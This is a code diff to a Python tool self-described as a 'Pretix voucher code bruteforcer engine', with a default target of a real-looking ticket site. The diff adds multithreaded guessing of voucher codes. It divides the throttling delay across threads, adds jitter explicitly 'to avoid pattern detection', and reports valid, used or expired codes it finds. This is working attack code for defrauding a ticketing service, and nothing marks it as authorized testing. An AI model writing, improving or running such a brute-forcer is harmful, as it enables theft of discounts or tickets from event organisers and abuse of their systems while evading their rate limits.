@@ -6,35 +6,44 @@ Pretix voucher code bruteforcer engine
 import requests
 import time
 import random
+import threading
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 
 class VoucherTester:
     """Core voucher testing engine"""
 
-    def __init__(self, base_url="https://tix.darkprague.com", verbose=False):
+    def __init__(self, base_url="https://tix.darkprague.com", verbose=False, threads=1):
         self.base_url = base_url
         self.verbose = verbose
+        self.threads = threads
         self.rate_limited = False
         self.request_count = 0
         self.start_time = datetime.now()
         self.tested_codes = set()
+        self.lock = threading.Lock()  # Thread-safe result aggregation
 
     def adaptive_delay(self):
         """Calculate adaptive delay based on request rate"""
-        self.request_count += 1
+        with self.lock:
+            self.request_count += 1
+            count = self.request_count
 
         # Base delay
         delay = 0.5
 
         # Increase delay if we've made many requests
-        if self.request_count > 100:
+        if count > 100:
             delay = 1.0
-        if self.request_count > 200:
+        if count > 200:
             delay = 2.0
 
+        # Per-thread rate limiting: distribute delay across threads
+        delay = delay / self.threads
+
         # Add jitter to avoid pattern detection
-        delay += random.uniform(0, 0.5)
+        delay += random.uniform(0, 0.3)
 
         return delay
 
@@ -178,8 +187,44 @@ class VoucherTester:
                 print(f"[RESULT] EXCEPTION - {str(e)}")
             return 'EXCEPTION', str(e)
 
+    def _update_results(self, results, code, status, detail):
+        """Thread-safe result update"""
+        with self.lock:
+            results['tested'] += 1
+            self.tested_codes.add(code)
+
+            if status == 'SUCCESS':
+                print(f"\n[!!!] VALID CODE FOUND: {code}")
+                print(f"      Details: {detail}")
+                results['SUCCESS'].append(code)
+            elif status == 'EXPIRED':
+                results['EXPIRED'].append(code)
+                if not self.verbose:
+                    print(f"[~] Expired but valid format: {code}")
+            elif status == 'USED':
+                results['USED'].append(code)
+                if not self.verbose:
+                    print(f"[~] Already used: {code}")
+            elif status == 'LIMITED':
+                results['LIMITED'].append(code)
+                if not self.verbose:
+                    print(f"[~] Limit reached: {code}")
+            elif status == 'UNKNOWN':
+                results['UNKNOWN'].append(code)
+                if not self.verbose:
+                    print(f"[?] Unknown response for {code}: {detail}")
+            elif status == 'NOTFOUND':
+                results['NOTFOUND'].append(code)
+
     def test_batch(self, codes, session, csrf_token, progress_callback=None):
-        """Test a batch of voucher codes"""
+        """Test a batch of voucher codes (uses threading if threads > 1)"""
+        if self.threads > 1:
+            return self._test_batch_threaded(codes, session, csrf_token, progress_callback)
+        else:
+            return self._test_batch_single(codes, session, csrf_token, progress_callback)
+
+    def _test_batch_single(self, codes, session, csrf_token, progress_callback=None):
+        """Single-threaded batch testing (original implementation)"""
         results = {
             'SUCCESS': [],
             'EXPIRED': [],
@@ -197,43 +242,12 @@ class VoucherTester:
 
             # Test the code
             status, detail = self.test_voucher(code, session, csrf_token)
-            results['tested'] += 1
-            self.tested_codes.add(code)
+            self._update_results(results, code, status, detail)
 
-            # Categorize result
-            if status == 'SUCCESS':
-                print(f"\n[!!!] VALID CODE FOUND: {code}")
-                print(f"      Details: {detail}")
-                results['SUCCESS'].append(code)
-
-            elif status == 'EXPIRED':
-                results['EXPIRED'].append(code)
-                if not self.verbose:
-                    print(f"[~] Expired but valid format: {code}")
-
-            elif status == 'USED':
-                results['USED'].append(code)
-                if not self.verbose:
-                    print(f"[~] Already used: {code}")
-
-            elif status == 'LIMITED':
-                results['LIMITED'].append(code)
-                if not self.verbose:
-                    print(f"[~] Limit reached: {code}")
-
-            elif status == 'UNKNOWN':
-                results['UNKNOWN'].append(code)
-                if not self.verbose:
-                    print(f"[?] Unknown response for {code}: {detail}")
-
-            elif status == 'NOTFOUND':
-                results['NOTFOUND'].append(code)
-                # Silent - generic 404
-
-            elif status == 'RATE_LIMITED':
+            # Rate limiting backoff
+            if status == 'RATE_LIMITED':
                 print("[!] Rate limited, backing off...")
                 time.sleep(60)
-                # Retry the same code
                 continue
 
             # Progress callback
@@ -248,5 +262,77 @@ class VoucherTester:
 
             # Adaptive delay
             time.sleep(self.adaptive_delay())
+
+        return results
+
+    def _test_batch_threaded(self, codes, session, csrf_token, progress_callback=None):
+        """Multi-threaded batch testing"""
+        results = {
+            'SUCCESS': [],
+            'EXPIRED': [],
+            'USED': [],
+            'LIMITED': [],
+            'UNKNOWN': [],
+            'NOTFOUND': [],
+            'tested': 0
+        }
+
+        # Filter out already tested codes
+        codes_to_test = [c for c in codes if c not in self.tested_codes]
+        total_codes = len(codes_to_test)
+
+        if not codes_to_test:
+            return results
+
+        print(f"[*] Using {self.threads} threads for parallel testing")
+
+        # Each thread gets its own session (thread-local)
+        def test_code_wrapper(code):
+            """Wrapper for thread execution"""
+            thread_session = requests.Session()
+            # Copy cookies from main session
+            thread_session.cookies.update(session.cookies)
+
+            status, detail = self.test_voucher(code, thread_session, csrf_token)
+            return code, status, detail
+
+        completed = 0
+        try:
+            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+                # Submit all jobs
+                future_to_code = {
+                    executor.submit(test_code_wrapper, code): code
+                    for code in codes_to_test
+                }
+
+                # Process results as they complete
+                for future in as_completed(future_to_code):
+                    code = future_to_code[future]
+                    try:
+                        code, status, detail = future.result()
+
+                        # Update results thread-safely
+                        self._update_results(results, code, status, detail)
+
+                        # Rate limiting backoff
+                        if status == 'RATE_LIMITED':
+                            print("[!] Rate limited detected, slowing down...")
+                            time.sleep(10)
+
+                        completed += 1
+
+                        # Progress indicator
+                        if not self.verbose and completed % 20 == 0:
+                            elapsed = (datetime.now() - self.start_time).seconds
+                            rate = results['tested'] / max(elapsed, 1)
+                            print(f"\n[*] Progress: {completed}/{total_codes} | Rate: {rate:.1f} req/s | Tested: {results['tested']}")
+
+                    except Exception as e:
+                        print(f"[!] Exception in thread for {code}: {e}")
+                        continue
+
+        except KeyboardInterrupt:
+            print("\n[!] Interrupted by user, shutting down threads...")
+            raise
 
         return results
